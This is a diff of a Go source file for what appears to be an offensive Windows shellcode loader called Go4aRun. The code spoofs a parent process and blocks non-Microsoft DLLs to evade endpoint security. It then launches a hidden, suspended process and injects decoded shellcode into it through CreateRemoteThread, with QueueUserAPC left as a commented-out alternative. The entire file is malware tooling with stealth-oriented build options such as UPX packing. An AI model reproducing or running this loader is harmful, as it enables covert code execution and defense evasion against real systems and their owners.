@@ -1,45 +1,36 @@
 //GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" Go4it.go
-//upx --brute go4it.go or go4it.exe
-//https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
-//https://gist.github.com/rvrsh3ll/1e66f0f2c7103ff8709e5fd63ca346ac
-
+//upx --brute Go4it.exe
 
 package main
 
 import (
+	"Go4aRun/pkg/shelly"
+	syscalls "Go4aRun/pkg/sliversyscalls/syscalls"
+	"Go4aRun/pkg/useful"
 	b64 "encoding/base64"
 	"encoding/hex"
-	"Go4aRun/pkg/useful"
-	"Go4aRun/pkg/shelly"
 	"golang.org/x/sys/windows"
-	"unsafe"
 	"log"
-	syscalls "Go4aRun/pkg/sliversyscalls/syscalls"
+	"unsafe"
 )
 
 func main() {
 
-	// Change change between not allowing non-MS and only store through nonms and onlystore vars
+	// Change block dll behavior: between "not allowing non-MS" and "only store" through nonms and onlystore vars
 	// Change parentName var to change spoofed parent
-	// Change programPath var for process to launch by parent and inject into
+	// Change programPath var to change process launched by parent which shellcode will inject into
 	// Change creationFlags to change behavior of programPath var launching
+	// Select a Proc Injection Method by comment/uncommenting the sections CreateRemoteThread or QueueUserAPC
 
-//Enum and get the pid of specified process
-procThreadAttributeSize := uintptr(0)
-
+	//Enum and get the pid of specified process
+	procThreadAttributeSize := uintptr(0)
 	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
-
 	procHeap, err := syscalls.GetProcessHeap()
-
 	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
-
 	defer syscalls.HeapFree(procHeap, 0, attributeList)
-
 	var startupInfo syscalls.StartupInfoEx
-
 	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
 	syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
-
 	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
 
 	//Options for Block Dlls
@@ -69,7 +60,7 @@ procThreadAttributeSize := uintptr(0)
 		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
 		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
 		//startupInfo.ShowWindow = windows.SW_HIDE
-		 creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
+		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT
@@ -85,7 +76,17 @@ procThreadAttributeSize := uintptr(0)
 
 		// Inject into Process
 		injectinto := int(procInfo.ProcessId)
-		defer useful.ShellCodeCreateRemoteThread(injectinto, decode)
+
+		//Choose A Proc Injection Method//
+
+		//CreateRemoteThread
+		var Proc, R_Addr, F = useful.WriteShellcode(injectinto, decode)
+		useful.ShellCodeCreateRemoteThread(Proc, R_Addr, F)
+
+		//QueueUserAPC
+		//var victimHandle = procInfo.Thread
+		//var _, R_Addr, _ = useful.WriteShellcode(injectinto, decode)
+		//useful.EBAPCQueue(R_Addr,victimHandle)
 	}
 
 }
